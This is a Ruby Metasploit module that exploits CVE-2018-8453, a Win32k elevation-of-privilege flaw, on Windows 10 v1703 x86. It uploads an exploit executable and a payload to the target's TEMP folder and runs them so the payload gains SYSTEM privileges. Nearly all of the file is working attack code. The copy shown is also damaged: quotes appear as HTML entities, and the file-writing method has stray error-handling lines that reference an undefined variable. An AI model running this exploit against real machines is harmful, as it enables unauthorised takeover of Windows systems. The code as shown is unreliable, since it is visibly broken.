# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
    &#039;Name&#039;            => &#039;Windows NtUserSetWindowFNID Win32k User Callback&#039;,
    &#039;Description&#039;     => %q{
        An elevation of privilege vulnerability exists in Windows when the Win32k component
        fails to properly handle objects in memory, aka "Win32k Elevation of Privilege Vulnerability."
        This affects Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows
        Server 2019, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2,
        Windows 10, Windows 10 Servers.

        This module is tested against Windows 10 v1703 x86.
      },
    &#039;License&#039;         => MSF_LICENSE,
    &#039;Author&#039;          => [
        &#039;ze0r&#039;,           # Exploit analysis and PoC
        &#039;Kaspersky Lab&#039;,  # Vulnerability discovery/detection
        &#039;Jacob Robles&#039;    # Metasploit module
      ],
    &#039;Platform&#039;        => &#039;win&#039;,
    &#039;Arch&#039;            => ARCH_X86,
    &#039;DefaultOptions&#039;  => {
        &#039;EXITFUNC&#039;    => &#039;thread&#039;
      },
    &#039;Targets&#039;         => [
        [ &#039;Windows 10 v1703 (Build 15063) x86&#039;, {
            &#039;UniqueProcessIdOffset&#039; => 180,
            &#039;TokenOffset&#039; => 252,
            &#039;Version&#039; => &#039;Windows 10 (Build 15063)&#039;
          }
        ]
      ],
    &#039;References&#039;      => [
        [&#039;CVE&#039;, &#039;2018-8453&#039;],
        [&#039;URL&#039;, &#039;https://github.com/ze0r/cve-2018-8453-exp&#039;],
        [&#039;URL&#039;, &#039;https://mp.weixin.qq.com/s/ogKCo-Jp8vc7otXyu6fTig&#039;],
        [&#039;URL&#039;, &#039;https://mp.weixin.qq.com/s/dcbUeegM0BqErtDufOXfoQ&#039;],
        [&#039;URL&#039;, &#039;https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/&#039;],
        [&#039;URL&#039;, &#039;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8453&#039;]
      ],
    &#039;Notes&#039; => {
        &#039;SideEffects&#039; => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS],
        &#039;Stability&#039;   => [CRASH_OS_RESTARTS]
      },
    &#039;DisclosureDate&#039;  => &#039;2018-10-09&#039;,
    &#039;DefaultTarget&#039;   => 0
    ))
  end

  def target_info
    fail_with(Failure::None, &#039;Session is already elevated&#039;) if is_system?

    unless sysinfo[&#039;OS&#039;].start_with?(target[&#039;Version&#039;]) && sysinfo[&#039;Architecture&#039;] == &#039;x86&#039;
      fail_with(Failure::NoTarget, &#039;Target is not compatible with exploit&#039;)
    end
  end

  def write_file_to_target(fname, data)
    tempdir = session.sys.config.getenv(&#039;TEMP&#039;)
    file_loc = "#{tempdir}\\#{fname}"
    vprint_warning("Attempting to write #{fname} to #{tempdir}")
    write_file(file_loc, data)
    vprint_good("#{fname} written")
    file_loc
    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    fail_with(Failure::Unknown, "Writing #{fname} to disk was unsuccessful")
  end

  def exploit
    target_info
    exe_name = &#039;CVE-2018-8453.exe&#039;
    exe_path = File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2018-8453&#039;, exe_name)
    vprint_status("Reading payload from file #{exe_path}")
    raw = File.read(exe_path)

    tmp_exe = "#{Rex::Text.rand_text_alphanumeric(10)}.exe"
    vprint_status("Uploading exploit exe as: #{tmp_exe}")
    exe_rpath = write_file_to_target(tmp_exe, raw)
    register_file_for_cleanup(exe_rpath)

    tmp_payload = "#{Rex::Text.rand_text_alpha(6..14)}.exe"
    payload_rpath = write_file_to_target(tmp_payload, generate_payload_exe)
    vprint_status("Uploading payload #{tmp_payload}")
    register_file_for_cleanup(payload_rpath)

    command = "\"#{exe_rpath}\" \"#{payload_rpath}\" #{target[&#039;UniqueProcessIdOffset&#039;]} #{target[&#039;TokenOffset&#039;]}"

    vprint_status("Executing command: #{command}")
    session.sys.process.execute(command, nil, {&#039;Hidden&#039; => false})
    print_good(&#039;Exploit finished, wait for privileged payload execution to complete.&#039;)
  end
end

